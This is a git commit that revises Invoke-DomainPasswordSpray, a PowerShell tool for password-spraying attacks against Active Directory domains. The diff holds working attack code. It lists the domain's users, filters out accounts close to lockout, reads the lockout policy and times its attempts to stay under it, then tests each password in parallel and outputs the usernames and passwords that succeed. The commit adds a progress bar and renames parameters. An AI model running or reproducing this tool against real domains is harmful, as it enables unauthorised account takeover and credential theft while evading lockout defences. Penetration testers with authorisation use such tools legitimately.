d601b3b43da2706f775506f162713d4ec06d26f5
Michael Davis <mdavis332@gmail.com>
2018-06-10 19:52:28 -0500

    Always generates userlist from domain. ShowProgress added.
    Generates a userlist from the domain no matter what. If user provides username(s) at runtime, those will be compared against the auto-generated safelist and any accounts from the user-provided list that don't exist, are locked out, are disabled, or are within 1 bad attempt of lockout will be removed. 
    Changed write-host to write-verbose. Verbose switch should be used to see relevant user info output to console.
    ShowProgress switch added as param to display progress bar for user spraying status.
    PasswordList param renamed to Password to follow PS convention. UserList param renamed to UserName to better follow PS convention.

--- public/Invoke-DomainPasswordSpray.ps1
+++ public/Invoke-DomainPasswordSpray.ps1
@@ -2,61 +2,72 @@ function Invoke-DomainPasswordSpray {
 
     <#
     .SYNOPSIS
-    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
-    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
-    Author: Beau Bullock (@dafthack),  Brian Fehrman (@fullmetalcache), and Michael Davis (@mdavis332)
-    License: MIT
-    Required Dependencies: Get-DomainUserList, Get-DomainPasswordPolicy, Invoke-Countdown, Invoke-Parallel
-    Optional Dependencies: None
+		This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain.
     .DESCRIPTION
-    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
-    .PARAMETER UserList
-    Optional UserList parameter. This will be generated automatically if not specified.
-    .PARAMETER PasswordList
-    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
+		This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain.
+		If the user provides a list of usernames at runtime, they will be compared against an auto-generated username "safelist" from the domain to ensure none of the provided accounts
+		will generate lockout errors.
+		Author: Beau Bullock (@dafthack),  Brian Fehrman (@fullmetalcache), and Michael Davis (@mdavis332)
+		License: MIT
+    .PARAMETER UserName
+		Optional UserName parameter. Accepts a string, array of strings, or any number of ADUser Objects.
+		A list of domain usernames will be generated automatically if not specified by querying the domain controller.
+    .PARAMETER Password
+		Password to attempt to use against each user. Can be a single string or array of strings.
     .PARAMETER DomainName
-    The domain to spray against.
+		The domain to spray against.
+	.PARAMETER ShowProgress
+		Optional switch that, when provided at runtime, displays a progress bar for user spraying status along with immediate console output of any successfully sprayed users
     
     .EXAMPLE
-    C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
-    Description
-    -----------
-    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
+		C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
+		Description
+		-----------
+		This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
     
 	.EXAMPLE
-    C:\PS> Invoke-DomainPasswordSpray -UserList (Get-Content 'c:\users.txt') -DomainName domain.local -PasswordList (Get-Content 'c:\passlist.txt') | Out-File 'sprayed-creds.txt'
-    Description
-    -----------
-    This command will use the userlist at users.txt and try to authenticate to the domain "domain.local" using each password in the passlist.txt file one at a time. 
-	It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
+		C:\PS> Invoke-DomainPasswordSpray -UserName (Get-Content 'c:\users.txt') -DomainName domain.local -PasswordList (Get-Content 'c:\passlist.txt') | Out-File 'sprayed-creds.txt'
+		Description
+		-----------
+		This command will use the userlist at users.txt and try to authenticate to the domain "domain.local" using each password in the passlist.txt file one at a time. 
+		It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
     #>
 	
 	[CmdletBinding()]
-	param (
-		[Parameter(	Position = 0, 
-					Mandatory = $true,
-					HelpMessage = "Password to use. This can be a single string or an array of strings."
+	[System.Diagnostics.CodeAnalysis.SuppressMessage('PSAvoidUsingPlainTextForPassword', '')]
+	param(
+		[Parameter(	
+			Position = 0, 
+			Mandatory = $true,
+			HelpMessage = 'Password to use. This can be a single string or an array of strings.'
 		)]
-		[string[]]$PasswordList,
+		[Alias('PasswordList')]
+		[string[]]$Password,
 		
-		[Parameter(	Position = 1, 
-					Mandatory = $false, 
-					ValueFromPipeline = $true, 
-					ParameterSetName = 'String',
-					HelpMessage = "User list against which to spray passwords. Can be a single string or array of strings."
+		[Parameter(	
+			Position = 1, 
+			Mandatory = $false,
+			ParameterSetName = 'String',
+			ValueFromPipelineByPropertyName=$true,
+			HelpMessage = 'UserName against which to spray passwords. Can be a single string or array of strings.'
 		)]
-		[string[]]$UserList,
+		[Alias('UserList', 'SamAccountName')]
+		[string[]]$UserName,
 		
-		# future expansion to include ADUser objects as a parameter
-		# [Parameter(Position = 1, Mandatory = $false, ValueFromPipeline = $true, ParameterSetName = 'Pipeline')]
-		# [Microsoft.ActiveDirectory.Management.ADAccount[]]$InputObject,
-		
-		[Parameter(	Position = 2, 
-					Mandatory = $false,
-					HelpMessage = "Fuly qualified domain name,e.g.: testlab.local. If nothing specified, script automatically attempts to pull FQDN from environment."
+		[Parameter(	
+			Position = 2, 
+			Mandatory = $false,
+			HelpMessage = 'Fuly qualified domain name,e.g.: testlab.local. If nothing specified, script automatically attempts to pull FQDN from environment.'
 		)]
 		[Alias('Domain')]
-		[string]$DomainName
+		[string]$DomainName,
+		
+		[Parameter(
+			Position = 3,
+			Mandatory = $false,
+			HelpMessage = "Optional switch that allows you to specify whether to show progress bar or not. Default is silent run because it's faster."
+		)]
+		[switch]$ShowProgress
 	)
 
 	$StartTime = Get-Date
@@ -79,58 +90,80 @@ function Invoke-DomainPasswordSpray {
 
 	$ObservationWindow = $DomainPasswordPolicy.'Lockout Observation Interval (Minutes)'
 	$LockoutThreshold = $DomainPasswordPolicy.'Account Lockout Threshold (Invalid logon attempts)' # don't scan more than this many times within the LockoutObservationWindow.Minutes
-
 	
-	<# expansion if ever include ADAccounts as input objects for parameter
-	# Pipeline input detector
-	if ($PSCmdlet.ParameterSetName -ne 'String') {
-		$UserList = $input | Select-Object -ExpandProperty Name
+	
+	# if there's no lockout threshold (ie, lockoutThreshold = 0, don't bother removing potential lockouts)
+	Write-Verbose '[*] Attempting to generate the list of users in the domain...'
+	if ($LockoutThreshold -eq 0) {
+		$AutoGeneratedUserList = Get-DomainUserList -RemoveDisabled -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
+	} else {
+		$AutoGeneratedUserList = Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
+		Write-Verbose "[*] The smallest lockout threshold discovered in the domain is $LockoutThreshold login attempts."
 	}
-	#>
-	# No pipeline and no parameter specified
-	if ($UserList -eq $null) {
-		Write-Host '[*] Now creating a list of users to spray...'
-		# if there's no lockout threshold (ie, lockoutThreshold = 0, don't bother removing potential lockouts)
-		if ($LockoutThreshold -eq 0) {
-			$UserList = Get-DomainUserList -RemoveDisabled -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
-		} else {
-			$UserList = Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
-			Write-Host "[*] The smallest lockout threshold discovered in the domain is $LockoutThreshold login attempts."
+	
+	if ($UserName -ne $null) {
+		# if the user has specified a custom user list, compare it to the autogenerated one and remove any usernames from the user-specified list if those are not in the
+		# autogenerated list. We do this because the autogenerated list has already filtered locked out, disabled, and potential lockout accounts. We don't want script
+		# users accidentally locking out accounts
+		Write-Verbose '[*] Comparing provided user list against auto-generated domain user list which is safe to spray'
+		[System.Collections.ArrayList]$CompareList = @()
+		$CompareList.AddRange($UserName) > $null
+		$RemovedUserCount = 0
+		for ($i = $CompareList.Count-1; $i -ge 0; $i--) {
+			if ($CompareList[$i] -notin $AutoGeneratedUserList) {
+				$CompareList.RemoveAt($i)
+				$RemovedUserCount++
+			}
 		}
+		Write-Verbose "[*] Removed $RemovedUserCount users because they:"
+		Write-Verbose "[*] (1) don't exist on the domain"
+		Write-Verbose "[*] (2) are disabled"
+		Write-Verbose "[*] (3) are locked out or"
+		Write-Verbose "[*] (4) are within 1 bad password attempt from lockout"
+		$UserName = $CompareList
+	} else {
+		$UserName = $AutoGeneratedUserList
 	}
 	
-	if ($UserList -eq $null -or $UserList.count -lt 1) {
+	if ($UserName -eq $null -or $UserName.count -lt 1) {
 		Write-Error '[*] No users available to spray. Exiting'
 		break
 	}
 	if ($LockoutThreshold -eq 0) {
-		Write-Host -ForegroundColor Yellow '[*] There appears to be no lockout policy. Go nuts'
+		Write-Verbose '[*] There appears to be no lockout policy. Go nuts'
 	}
 
-	Write-Host "[*] The domain password policy observation window is set to $ObservationWindow minutes."
-	Write-Host -ForegroundColor Yellow "[*] Password spraying has begun against $($UserList.count) users on the $DomainName domain. Current time is $($StartTime.ToShortTimeString())"
+	Write-Verbose "[*] The domain password policy observation window is set to $ObservationWindow minutes"
+	Write-Verbose "[*] Password spraying has begun against $($UserName.count) users on the $DomainName domain. Current time is $($StartTime.ToShortTimeString())"
 	
 	$CurrentPasswordIndex = 0
 	
-	foreach ($Password in $PasswordList) {
+	foreach ($PasswordItem in $Password) {
 		
 		$PasswordStartTime = Get-Date
 		
-		Write-Host "[*] Trying Password $($CurrentPasswordIndex+1) of $($PasswordList.count): $Password"	
+		Write-Verbose "[*] Beginning trying password $($CurrentPasswordIndex+1) of $($Password.count): $PasswordItem"	
 		
-		$UserList | Invoke-Parallel -ImportVariables -Throttle 20 -Quiet -ScriptBlock {
+		if ($ShowProgress) {
+			$InvokeParallelParams = @{ Quiet = $false }
+		} else {
+			$InvokeParallelParams = @{ Quiet = $true }
+		}
+		
+		$UserName | Invoke-Parallel -ImportVariables -Throttle 20 -Verbose:$false @InvokeParallelParams -ScriptBlock {
 			
 			
-			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentDomain, $_, $Using:Password)
+			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentDomain, $_, $Using:PasswordItem)
 			
 			if ($TestDomain.Name -ne $null) {
 				
-				
-				Write-Host -ForegroundColor Green "[*] SUCCESS! User $_ has the password $Password"
+				if ($ShowProgress) {
+					Write-Host -ForegroundColor Green "[*] SUCCESS! User $_ has the password $PasswordItem"
+				}
 				
 				$CredDetails = New-Object PSObject
 				$CredDetails | Add-Member -MemberType NoteProperty -Name "UserName" -Value $_
-				$CredDetails | Add-Member -MemberType NoteProperty -Name "Password" -Value $Using:Password
+				$CredDetails | Add-Member -MemberType NoteProperty -Name "Password" -Value $Using:PasswordItem
 				$CredDetails | Add-Member -MemberType NoteProperty -Name "DomainName" -Value $Using:DomainName
 				
 				$CredDetails
@@ -141,12 +174,12 @@ function Invoke-DomainPasswordSpray {
 		
 		$PasswordEndTime = Get-Date
 		$PasswordElapsedTime = New-Timespan –Start $PasswordStartTime –End $PasswordEndTime
-		Write-Host "[*] Finished trying password $Password at $($PasswordEndTime.ToShortTimeString())"
-		Write-Host $("[*] Total time elapsed trying $Password was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $PasswordElapsedTime)
+		Write-Verbose "[*] Finished trying password $($CurrentPasswordIndex+1) of $($Password.count): $PasswordItem at $($PasswordEndTime.ToShortTimeString())"
+		Write-Verbose $("[*] Total time elapsed trying $PasswordItem was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $PasswordElapsedTime)
 
 		$CurrentPasswordIndex++
-		if ($LockoutThreshold -gt 0 -and ( $($PasswordList.count) - $CurrentPasswordIndex ) -gt 0) {
-			Invoke-Countdown -Seconds (60 * $ObservationWindow) -Message "Spraying users on domain $DomainName" -Subtext "[*] $CurrentPasswordIndex of $($PasswordList.count) passwords complete. Pausing to avoid account lockout"
+		if ($LockoutThreshold -gt 0 -and ( $($Password.count) - $CurrentPasswordIndex ) -gt 0) {
+			Invoke-Countdown -Seconds (60 * $ObservationWindow) -Message "Spraying users on domain $DomainName" -Subtext "[*] $CurrentPasswordIndex of $($Password.count) passwords complete. Pausing to avoid account lockout"
 		}
 		
 	}
@@ -154,7 +187,7 @@ function Invoke-DomainPasswordSpray {
 	
 	$EndTime = Get-Date
 	$ElapsedTime = New-Timespan –Start $StartTime –End $EndTime
-	Write-Host -ForegroundColor Yellow "[*] Password spraying is complete at $($EndTime.ToShortTimeString())"
-	Write-Host $("[*] Overall runtime was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $ElapsedTime)
+	Write-Verbose "[*] Password spraying is complete at $($EndTime.ToShortTimeString())"
+	Write-Verbose $("[*] Overall runtime was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $ElapsedTime)
 	
 }
